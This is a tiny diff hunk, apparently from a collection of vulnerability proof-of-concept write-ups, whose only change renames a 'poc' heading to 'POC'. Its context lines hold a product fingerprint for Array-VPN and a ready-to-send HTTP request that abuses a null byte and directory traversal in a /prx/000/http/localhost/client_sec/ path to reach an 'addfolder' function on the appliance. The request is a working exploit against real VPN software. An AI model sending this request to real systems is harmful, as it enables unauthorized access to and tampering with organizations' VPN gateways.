@@ -6,7 +6,7 @@ product="Array-VPN"
 ```
 
 
-## poc
+## POC
 ```
 GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
 Host: ip:port
